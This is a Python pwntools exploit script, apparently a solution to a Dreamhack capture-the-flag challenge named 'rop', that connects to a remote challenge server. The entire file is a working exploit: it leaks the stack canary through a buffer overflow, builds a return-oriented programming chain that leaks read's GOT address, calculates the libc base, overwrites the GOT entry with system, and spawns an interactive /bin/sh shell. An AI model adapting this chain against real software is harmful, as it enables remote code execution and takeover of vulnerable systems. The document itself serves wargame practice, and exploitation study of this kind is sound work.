from pwn import *

def slog(name, addr):
    return success(': '.join([name, hex(addr)]))

p = remote('host3.dreamhack.games', 17011)
e = ELF('./rop')
libc = ELF('./libc.so.6')

read_got = e.got['read']
read_plt = e.plt['read']
write_plt = e.plt['write']
puts_plt = e.plt['puts']
pop1 = 0x400853
pop2 = 0x400851
ret = 0x400854

# Leak Canary
p.sendafter(b'Buf: ', b'A' * 0x39)
p.recvuntil(b'A' * 0x39)
canary = u64(b'\x00' + p.recvn(7))
slog('canary', canary)

# Do ROP
buf = b'A' * 0x38
buf += p64(canary)
buf += b'A' * 0x8

#   write(1, read_got, ..)
buf += p64(pop1) + p64(1)
buf += p64(pop2) + p64(read_got) + p64(0)
buf += p64(write_plt)

#   read(0, read_got, ..)
buf += p64(pop1) + p64(0)
buf += p64(pop2) + p64(read_got) + p64(0)
buf += p64(read_plt)

#   read("/bin/sh") => system("/bin/sh")
buf += p64(pop1) + p64(read_got + 8)
buf += p64(ret) + p64(read_plt)

p.sendafter(b'Buf: ', buf)
read = u64(p.recvn(6) + b'\x00' * 2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
slog('libc base', lb)
slog('system', system)

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()